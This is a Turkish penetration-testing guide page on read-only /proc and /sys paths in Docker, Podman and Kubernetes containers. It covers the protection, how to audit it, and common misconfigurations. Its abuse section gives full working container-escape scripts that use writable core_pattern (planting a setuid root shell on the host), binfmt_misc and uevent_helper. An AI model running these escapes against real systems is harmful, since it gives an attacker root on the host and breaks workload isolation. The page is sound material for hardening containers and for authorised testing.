# Salt Okunur Sistem Yolları

{{#include ../../../../banners/hacktricks-training.md}}

Salt okunur sistem yolları, maskelenmiş yollardan ayrı bir korumadır. Bir yolu tamamen gizlemek yerine runtime onu görünür kılar ama salt okunur olarak bağlar. Bu, okuma erişiminin kabul edilebilir veya operasyonel olarak gerekli olabileceği ancak yazmanın çok tehlikeli olacağı seçilmiş procfs ve sysfs konumları için yaygındır.

Amaç açıktır: birçok çekirdek arayüzü yazılabilir olduğunda çok daha tehlikeli hale gelir. Bir salt okunur mount tüm keşif değerini ortadan kaldırmaz, ancak ele geçirilmiş bir iş yükünün bu yol aracılığıyla çekirdeğe bakan dosyaları değiştirmesini engeller.

## Çalışma

Runtime'lar genellikle proc/sys görünümünün bazı bölümlerini salt okunur olarak işaretler. Runtime ve host'a bağlı olarak, bu şunlar gibi yolları içerebilir:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Gerçek liste değişkenlik gösterir, ama model aynıdır: gerekli yerlerde görünürlüğe izin ver, varsayılan olarak değişikliklere izin verme.

## Laboratuvar

Docker tarafından belirtilen salt okunur yol listesini inceleyin:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Konteyner içinden monte edilmiş proc/sys görünümünü inceleyin:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Güvenlik Etkisi

Salt okunur sistem yolları, ana makineyi etkileyen geniş bir kötüye kullanım sınıfını daraltır. Bir saldırgan procfs veya sysfs'i inceleyebilse bile, buralara yazamamak çekirdek ayarları, çökme işleyicileri, modül yükleme yardımcıları veya diğer kontrol arayüzleriyle ilgili birçok doğrudan değiştirme yolunu ortadan kaldırır. Açığa çıkma tamamen ortadan kalkmaz, ancak bilgi açığından ana makine üzerinde etki oluşturmaya geçiş zorlaşır.

## Yanlış Yapılandırmalar

Ana hatalar, hassas yolların maskesinin kaldırılması veya yeniden mount edilerek okuma-yazma yapılması, host proc/sys içeriğinin yazılabilir bind mount'larla doğrudan açığa çıkarılması veya daha güvenli runtime varsayılanlarını fiilen atlatan ayrıcalıklı modların kullanılmasıdır. Kubernetes'te, `procMount: Unmasked` ve ayrıcalıklı iş yükleri genellikle daha zayıf proc koruması ile birlikte görülür. Diğer yaygın operasyonel hata, runtime genellikle bu yolları salt okunur olarak mount ettiği için tüm iş yüklerinin hâlâ o varsayılanı miras aldığı varsayımıdır.

## Kötüye Kullanım

Koruma zayıfsa, yazılabilir proc/sys girdilerine bakarak başlayın:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Yazılabilir girdiler mevcut olduğunda, yüksek değere sahip takip yolları şunlardır:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- /proc/sys altındaki yazılabilir girdiler genellikle konteynerin yalnızca incelemek yerine host kernel davranışını değiştirebilmesini gösterir.
- `core_pattern` özellikle önemlidir çünkü yazılabilir bir host-facing değer, bir pipe handler ayarlandıktan sonra bir sürecin çökertilmesiyle host code-execution yoluna dönüştürülebilir.
- `modprobe` kernel tarafından module-loading ile ilgili akışlarda kullanılan helper'ı ortaya çıkarır; yazılabilir olduğunda klasik yüksek-değerli bir hedeftir.
- `binfmt_misc` size özel interpreter registration'ının mümkün olup olmadığını söyler. Eğer registration yazılabiliyorsa, bu sadece bir information leak yerine bir execution primitive'e dönüşebilir.
- `panic_on_oom` host-genel bir kernel kararını kontrol eder ve bu nedenle kaynak tükenmesini host denial of service'e dönüştürebilir.
- `uevent_helper` yazılabilir bir sysfs helper path'in host-context execution üreten en açık örneklerinden biridir.

İlginç bulgular arasında normalde read-only olması gereken yazılabilir host-facing proc knobs veya sysfs entries bulunur. Bu noktada workload, kısıtlı bir container görüşünden anlamlı kernel influence'a doğru kaymıştır.

### Tam Örnek: `core_pattern` Host Escape

Eğer `/proc/sys/kernel/core_pattern` konteyner içinden yazılabiliyor ve host kernel görünümüne işaret ediyorsa, bir çökme sonrası bir payload'u çalıştırmak için kullanılabilir:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Eğer yol gerçekten host kernel'ine ulaşırsa, payload host'ta çalışır ve geride bir setuid shell bırakır.

### Tam Örnek: `binfmt_misc` Kayıt

Eğer `/proc/sys/fs/binfmt_misc/register` yazılabiliyorsa, özel bir yorumlayıcı kaydı, eşleşen dosya çalıştırıldığında kod yürütme üretebilir:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Host'a bakan yazılabilir `binfmt_misc` üzerinde, sonuç kernel tarafından tetiklenen yorumlayıcı yolunda kod yürütülmesidir.

### Tam Örnek: `uevent_helper`

Eğer `/sys/kernel/uevent_helper` yazılabiliyorsa, eşleşen bir olay tetiklendiğinde kernel bir host-path helper'ını çağırabilir:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Bunun bu kadar tehlikeli olmasının nedeni, helper path'in güvenli, sadece konteyner içi bir bağlamdan değil, host dosya sistemi perspektifinden çözülmesidir.

## Checks

Bu kontroller, procfs/sysfs'in beklenen yerlerde yalnızca okunur olup olmadığını ve iş yükünün hâlâ hassas kernel arayüzlerini değiştirip değiştiremeyeceğini belirler.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- Normal olarak sertleştirilmiş bir iş yükü çok az yazılabilir /proc/sys girdisi açığa çıkarmalıdır.
- Yazılabilir `/proc/sys` yolları genellikle sıradan okuma erişiminden daha önemlidir.
- Eğer runtime bir yolun salt okunur olduğunu söylüyorsa ancak uygulamada yazılabiliyorsa, mount propagation, bind mounts ve privilege ayarlarını dikkatle gözden geçirin.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Docker hassas proc girdileri için varsayılan bir salt okunur yol listesi tanımlar | host proc/sys mountlarını açığa çıkarmak, `--privileged` |
| Podman | Varsayılan olarak etkin | Podman açıkça gevşetilmedikçe varsayılan salt okunur yolları uygular | `--security-opt unmask=ALL`, geniş host mountları, `--privileged` |
| Kubernetes | Runtime varsayılanlarını devralır | Pod ayarları veya host mountlarıyla zayıflatılmadıkça altta yatan runtime'ın salt okunur yol modelini kullanır | `procMount: Unmasked`, privileged iş yükleri, yazılabilir host /proc/sys mountları |
| containerd / CRI-O under Kubernetes | Runtime varsayılanı | Genellikle OCI/runtime varsayılanlarına dayanır | Kubernetes satırıyla aynı; doğrudan runtime yapılandırma değişiklikleri davranışı zayıflatabilir |

Önemli nokta, salt okunur sistem yollarının genellikle bir runtime varsayılanı olarak mevcut olmasıdır, ancak privileged modlar veya host bind mountları ile kolayca aşılabilirler.
{{#include ../../../../banners/hacktricks-training.md}}
